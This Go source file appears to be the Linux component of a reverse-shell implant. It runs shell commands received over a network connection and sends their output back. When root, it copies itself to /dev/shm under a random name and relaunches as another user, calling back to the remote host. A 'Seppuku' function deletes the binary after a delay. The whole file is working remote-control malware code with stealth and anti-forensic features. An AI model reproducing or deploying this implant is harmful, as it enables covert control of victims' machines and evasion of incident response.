package shell

import (
	"net"
	"log"
	"os"
	"os/exec"
	"os/user"
	"fmt"
	"strings"
	"errors"

	"../utils"
)

/*
 It would be awesome if someone implemented this as well ;-)
*/

// Shell ...
func Shell() *exec.Cmd {
	cmd := exec.Command("/bin/bash", "-i")
	return cmd
}

// Exec ...
func Exec(command string, c net.Conn) {
	path := "/bin/sh"
	cmd := exec.Command(path, "-c", command)
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// RunAsPs ...
func RunAs(username string, pass string, domain string, c net.Conn) {
	current, err := user.Current()
	if (err != nil) {
		c.Write([]byte("Error: " + err.Error() + "\n"))
		return
	}
	uid := current.Uid
	if (uid == "0") {
		path := CopySelf()
		err = os.Chmod(path, 0755)
		if (err != nil) {
			c.Write([]byte("Error: Couldn't chmod\n"))
			return
		}
		ip, port := utils.SplitAddress(c.RemoteAddr().String())
		args := fmt.Sprintf("%s %s %s", path, ip, port)
		fmt.Println(args)
		err = CreateProcessAsUser(username, path, args)
		if (err != nil) {
			c.Write([]byte("Error: " + err.Error() + "\n"))
			return
		}
		fmt.Println("Closing...")
		c.Close()
		return
	} else {
		c.Write([]byte("Error: Not root\n"))
		return
	}
}

// RunAsPs ...
func RunAsPS(username string, pass string, domain string, c net.Conn) {
	c.Write([]byte("Not implemented\n"))
}

// ExecSC ....
func ExecSC(sc []byte) {
	fmt.Println("Not implemented")
}

// ExecOut ...
func ExecOut(command string) (string, error) {
	path := "/bin/sh"
	cmd := exec.Command(path, "-c", command)
	out, err := cmd.CombinedOutput()
	return string(out), err}

// ExecPSOut ...
func ExecPSOut(command string) (string, error) {
	fmt.Println("Not implemented")
	return "", errors.New("Not implemented")
}

// ExecDebug ...
func ExecDebug(cmd string) (string, error) {
	out, err := ExecOut(cmd)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecPSDebug ...
func ExecPSDebug(cmd string) (string, error) {
	fmt.Println("Not implemented")
	return "", errors.New("Not implemented")
}

// Powershell ...
func Powershell() (*exec.Cmd, error) {
	fmt.Println("Not implemented")
	return nil, errors.New("Not implemented")
}

// CopySelf ...
func CopySelf() string {
	currentPath := os.Args[0]
	// random name
	name := utils.RandSeq(8)
	path := fmt.Sprintf("/dev/shm/%s", name)
	utils.CopyFile(currentPath, path)
	return path
}

// ExecSilent ...
func ExecSilent(command string, c net.Conn) {
	path := "/bin/sh"
	cmd := exec.Command(path, "-c", command)
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// Seppuku ...
func Seppuku(c net.Conn) {
	binPath := os.Args[0]
	fmt.Println(binPath)
	go Exec(fmt.Sprintf("sleep 5 && rm %s", binPath), c)
}
